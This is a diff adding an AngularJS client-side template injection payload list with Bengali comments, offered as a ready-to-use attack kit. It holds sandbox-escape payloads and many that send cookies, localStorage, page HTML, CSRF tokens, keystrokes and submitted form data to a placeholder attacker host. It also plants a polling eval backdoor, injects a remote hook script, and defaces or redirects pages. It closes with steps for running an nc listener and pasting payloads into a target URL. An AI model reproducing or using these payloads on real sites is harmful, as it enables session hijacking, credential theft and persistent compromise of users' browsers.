@@ -1,0 +1,79 @@
+// ============= ANGULARJS INJECTION - কমপ্লিট পেলোড লিস্ট =============
+
+// 1. বেসিক ডিটেকশন
+{{5+5}}
+{{alert(1)}}
+{{console.log(1)}}
+{{confirm(1)}}
+
+// 2. স্যান্ডবক্স এসকেপ
+{{constructor.constructor('alert(1)')()}}
+{{[].pop.constructor('alert(1)')()}}
+{{0.constructor.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{$new.constructor('alert(1)')()}}
+{{''.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}
+
+// 3. কুকি চুরি
+{{constructor.constructor('fetch("http://YOUR-IP:4444?c="+document.cookie)')()}}
+{{constructor.constructor('new Image().src="http://YOUR-IP:4444?c="+document.cookie')()}}
+
+// 4. লোকাল স্টোরেজ চুরি
+{{constructor.constructor('fetch("http://YOUR-IP:4444",{method:"POST",body:JSON.stringify(localStorage)})')()}}
+
+// 5. পেজ ডাটা এক্সফিলট্রেট
+{{constructor.constructor('fetch("http://YOUR-IP:4444?html="+btoa(document.body.innerHTML))')()}}
+
+// 6. পেজ ডিফেসমেন্ট
+{{constructor.constructor('document.body.innerHTML="<h1 style=color:red>HACKED</h1>"')()}}
+
+// 7. রিডাইরেক্ট
+{{constructor.constructor('window.location="http://YOUR-IP:4444/phishing.html"')()}}
+
+// 8. পার্মানেন্ট ব্যাকডোর
+{{constructor.constructor('setInterval(()=>{fetch("http://YOUR-IP:4444/cmd").then(r=>r.text()).then(eval)},5000)')()}}
+
+// 9. কী-লগার
+{{constructor.constructor('let k="";document.onkeypress=e=>{k+=e.key;if(k.length>10){fetch("http://YOUR-IP:4444?k="+k);k=""}}')()}}
+
+// 10. ফর্ম হাইজ্যাক
+{{constructor.constructor('document.querySelectorAll("form").forEach(f=>{f.addEventListener("submit",e=>{let d=new FormData(f);fetch("http://YOUR-IP:4444/form",{method:"POST",body:JSON.stringify([...d])})})})')()}}
+
+// 11. বিটিডব্লিউ হুক
+{{constructor.constructor('var s=document.createElement("script");s.src="http://YOUR-IP:3000/hook.js";document.body.appendChild(s)')()}}
+
+// 12. ক্রিপ্টো মাইনার
+{{constructor.constructor('setInterval(()=>{for(let i=0;i<1000000;i++)Math.random()},100)')()}}
+
+// 13. CSRF টোকেন চুরি
+{{constructor.constructor('let t=document.querySelector("meta[name=csrf-token]");if(t)fetch("http://YOUR-IP:4444?csrf="+t.content)')()}}
+
+// 14. WAF বাইপাস (এনকোডিং)
+{{constructor['constructor']('alert(1)')()}}
+{{constructor["constructor"]("alert(1)")()}}
+{{constructor\u002Econstructor('alert(1)')()}}
+
+// 15. ভিজুয়াল কনফার্মেশন
+{{constructor.constructor('document.body.style.backgroundColor="red"')()}}
+{{constructor.constructor('document.title="HACKED"')()}}
+
+// 16. অল-ইন-ওয়ান মেগা পেলোড
+{{constructor.constructor('fetch("http://YOUR-IP:4444?c="+document.cookie);fetch("http://YOUR-IP:4444?ls="+JSON.stringify(localStorage));document.body.innerHTML="<h1>HACKED</h1>";setInterval(()=>{fetch("http://YOUR-IP:4444/cmd").then(r=>r.text()).then(eval)},5000)')()}}
+
+// ============= সবচেয়ে গুরুত্বপূর্ণ 3টি (প্রায়ই কাজ করে) =============
+// #1 বেসিক টেস্ট
+{{5+5}}
+
+// #2 এলার্ট
+{{alert(1)}}
+
+// #3 কুকি চুরি
+{{constructor.constructor('fetch("http://YOUR-IP:4444?c="+document.cookie)')()}}
+
+// ============= ব্যবহার করার নিয়ম =============
+// 1. YOUR-IP এর জায়গায় আপনার IP দিন: 172.22.33.47
+// 2. লিসেনার চালান: nc -lvp 4444
+// 3. URL এ পেস্ট করুন:
+//    http://target.com/angular?name=PAYLOAD_HERE
+// 4. ব্রাউজার কনসোলে সরাসরি试试:
+//    angular.module('xss',[]).run(['$rootScope',function(s){s.alert(1)}])
